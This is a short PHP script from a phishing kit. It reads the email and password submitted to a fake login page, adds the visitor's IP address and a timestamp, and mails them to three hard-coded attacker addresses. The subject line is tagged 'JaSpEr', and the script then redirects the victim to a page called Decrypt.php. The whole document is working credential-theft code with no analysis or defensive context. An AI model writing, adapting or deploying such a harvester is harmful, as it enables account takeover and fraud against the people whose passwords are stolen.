<?
session_start();
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$user1 = $_POST['email'];
$pass1 = $_POST['password'];
$chaseme="rosetaylor4444@gmail.com,Richardsmith292929@protonmail.com,richardsmith292929@yandex.com";


  $subj = "[Decrypt] JaSpEr $ip";
  $msg = "Doc Info\n\nUsername: $user1\nPassword: $pass1\n$ip $adddate\n-----------------------------------\n        Created By JaSpEr\n-----------------------------------";
  $from = "From: <New-Login>";
  mail("$chaseme", $subj, $msg, $from);
  header("Location: Decrypt.php");